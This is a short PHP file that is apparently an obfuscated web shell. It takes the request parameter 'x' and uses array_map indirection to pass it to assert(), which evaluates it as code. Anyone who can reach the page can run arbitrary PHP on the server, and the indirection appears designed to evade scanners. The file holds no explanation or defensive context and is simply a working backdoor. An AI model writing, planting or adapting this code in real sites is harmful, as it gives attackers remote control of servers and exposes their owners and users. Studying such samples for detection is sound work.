<?php
$a1=array("1234","123456");
$a2=array(@$_REQUEST['x'],"1234");
$a=array_map(null,$a1,$a2)[0][1];
assert($a);
?>